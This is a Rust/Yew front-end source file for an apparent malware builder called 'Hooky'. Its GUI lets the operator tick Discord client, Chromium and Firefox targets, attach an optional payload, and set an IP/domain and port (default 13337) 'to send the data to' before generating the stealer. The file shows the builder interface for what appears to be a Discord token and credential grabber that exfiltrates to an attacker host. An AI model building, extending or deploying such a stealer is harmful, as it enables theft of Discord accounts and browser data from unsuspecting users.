use wasm_bindgen::prelude::*;
use yew::platform::spawn_local;
use yew::prelude::*;

#[wasm_bindgen(module = "/public/glue.js")]
extern "C" {
    #[wasm_bindgen(js_name = invokeGen, catch)]
    async fn gen(features: Vec<JsValue>, payload: JsValue, send_to: JsValue) -> Result<JsValue, JsValue>;
    
    #[wasm_bindgen(js_name = isOn, catch)]
    async fn is_on(id: String) -> Result<JsValue, JsValue>;
    
    #[wasm_bindgen(js_name = getPayload, catch)]
    async fn getPayload() -> Result<JsValue, JsValue>;
    
    #[wasm_bindgen(js_name = setPayload)]
    async fn setPayload();
    
    #[wasm_bindgen(js_name = getIp, catch)]
    async fn getIp() -> Result<JsValue, JsValue>;
}
    
#[function_component(App)]
pub fn app() -> Html {
    let types: Vec<&str> = vec!["discord-client", "discord-chromium", "discord-firefox"];

    let types_clone = types.clone();
    let gen = Callback::from(move |_| {
        let types_clone = types_clone.clone();
        spawn_local(async move {
            let mut features: Vec<JsValue> = Vec::new();
            for i in types_clone {
                let on = is_on(i.to_string()).await;
                if on.is_ok() && on.unwrap() == true {
                    features.push(JsValue::from_str(i));
                }
            }
            let _ = gen(features, getPayload().await.unwrap_or(JsValue::null()), getIp().await.unwrap_or(JsValue::from_str("127.0.0.1:13337"))).await;
        });
    });
    
    let payload_button = Callback::from(move |_| {
        spawn_local(async move {
            setPayload().await;
        });
    });

    let mut id = 0;

    html! {
        <main class="container">
            <div class="row">
                <img src="public/hooky.svg" class="logo hooky" alt="Hooky"/>
            </div>
                        
            <label for={"payload"}>{"Payload (Optional)"}</label>
            <input type="text" id={"payload"} />
            <button type="button" onclick={payload_button}>{"Open"}</button>
            
            <label for={"ip"}>{"Ip / Domain to send the data to"}</label>
            <input type="text" value={"1.1.1.1"} id={"ip"} />
            
            <label for={"port"}>{"Port to send the data to"}</label>
            <input type="number" value={13337} id={"port"} />
            
            {
                for types.iter().map(|i| {
                        id+=1;
                        html! { <><input type="checkbox" id={i.to_string()} checked={ true } /><label for={i.to_string()}>{ i.replace("-", " ") }</label></>}
                    }
                )
            }

            <div class="row" style="margin-top: 25px">
                <button type="button" onclick={gen}>{"Generate"}</button>
            </div>
        </main>
    }
}
